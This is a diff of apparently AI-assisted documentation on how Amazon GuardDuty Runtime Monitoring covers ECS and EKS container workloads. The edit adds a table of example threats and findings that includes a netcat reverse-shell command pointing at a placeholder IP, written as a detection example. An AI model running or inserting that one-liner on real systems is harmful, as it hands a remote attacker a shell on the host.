@@ -1004,28 +1004,27 @@ Amazon GuardDuty monitors EC2 instances for a wide range of suspicious or malici
 
 ---
 
-You’re right—GuardDuty doesn’t offer an **ECS‑specific** “protection plan.” Instead:
+# ECS Protection
+GuardDuty doesn’t offer an **ECS‑specific** “protection plan.” Instead:
 
 * **Container workloads** on **ECS (both EC2-backed and Fargate)** are covered under **Runtime Monitoring**, which is a **general feature** for EC2/EKS/ECS.
 * There is **no standalone “ECS Protection”** toggle in GuardDuty.
 
-Below is the **corrected container‑workload section**, reflecting how GuardDuty actually protects ECS tasks:
-
----
-
 ## Container Runtime Monitoring (covers ECS & EKS)
+
+**Container Runtime Monitoring (covers ECS & EKS)**
 
 1. **GuardDuty Checks for Container Workloads**
    GuardDuty’s **Runtime Monitoring** feature ingests OS‑ and container‑level telemetry for EC2‑backed ECS tasks and Fargate, plus EKS pods:
 
-   | Data Source / Feature      | What It Captures                                                   | Example Threat & Finding                                                                                        |
-   | -------------------------- | ------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------- |
-   | **Runtime Monitoring** ⭐️  | Processes, file events, network connections within containers/pods | **Crypto‑Mining**: Detected `xmrig` process inside a Fargate task CryptoCurrency\:EC2/LinuxCryptominingTool   |
-   | **VPC Flow Logs**          | Network traffic to/from task ENIs                                  | **Portscan**: Task probing port 8080 on another container Recon\:EC2/PortscanContainerInstance                |
-   | **DNS Query Logs**         | DNS lookups from within the task’s networking namespace            | **C2 Communication**: Container resolving a known malware domain Backdoor\:EC2/C\&CActivity.B!DNS             |
-   | **CloudTrail Mgmt Events** | ECS API usage—`RunTask`, `StopTask`, `UpdateService`, etc.         | **Unauthorized Task Launch**: `RunTask` by unusual principal UnauthorizedAccess\:EC2/MaliciousIPCaller.Custom |
+   | Data Source / Feature      | What It Captures                                                   | Example Threat & Finding                                                                                               |
+   | -------------------------- | ------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------- |
+   | **Runtime Monitoring** ⭐️  | Processes, file events, network connections within containers/pods | **Reverse Shell**: Detected `nc -e /bin/bash 192.0.2.10 4444` inside a Fargate task Behavior\:EC2/NetworkPortUnusual |
+   | **VPC Flow Logs**          | Network traffic to/from task ENIs                                  | **Portscan**: Task probing container port 8080 Recon\:EC2/PortscanContainerInstance                                  |
+   | **DNS Query Logs**         | DNS lookups from within the task’s networking namespace            | **C2 Communication**: Container resolving a known malware domain Backdoor\:EC2/C\&CActivity.B!DNS                    |
+   | **CloudTrail Mgmt Events** | ECS API usage—`RunTask`, `StopTask`, `UpdateService`, etc.         | **Unauthorized Task Launch**: `RunTask` by unusual principal UnauthorizedAccess\:EC2/MaliciousIPCaller.Custom        |
 
-   ⭐️ *“Runtime Monitoring” must be explicitly enabled under GuardDuty → Settings → Additional features.*
+   ⭐️ *“Runtime Monitoring” must be explicitly enabled under GuardDuty → Settings → Additional features.*
 
 2. **Enabling Runtime Monitoring**
 
